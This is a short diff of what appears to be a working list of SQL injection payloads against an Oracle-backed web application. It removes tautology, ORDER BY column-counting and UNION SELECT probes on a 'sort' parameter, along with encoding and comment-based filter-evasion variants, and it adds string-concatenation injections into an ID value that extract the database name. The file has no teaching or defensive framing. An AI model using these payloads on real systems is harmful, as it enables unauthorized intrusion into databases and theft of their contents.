@@ -1,18 +1,4 @@
-sort=createdByTime' OR '1'='1
-sort=createdByTime' ORDER BY 1--
-  
-sort=createdByTime' ORDER BY 1--
-sort=createdByTime' ORDER BY 2--
-sort=createdByTime' ORDER BY 3--
+J038825458737676'%20||%20(SELECT%20sys_context('USERENV','DB_NAME')%20FROM%20dual)%20||'
+J038825458737676'%20||%20(SELECT%20name%20FROM%20v$database)%20||'
 
-sort=createdByTime' UNION SELECT sys_context('USERENV', 'DB_NAME') FROM dual--
-
-
-sort=createdByTime'%20ORDER%20BY%201--
-sort=createdByTime'%20UNION%20SELECT%20sys_context('USERENV','DB_NAME')%20FROM%20dual--
-sort=createdByTime'/**/ORDER/**/BY/**/1--
-sort=createdByTime'/**/UNION/**/SELECT/**/sys_context('USERENV','DB_NAME')/**/FROM/**/dual--
-sort=createdByTime'%09ORDER%09BY%091--
-sort=createdByTime'||(SELECT/**/sys_context('USERENV','DB_NAME')/**/FROM/**/dual)||
-sort=createdByTime'%2520ORDER%2520BY%25201--
 
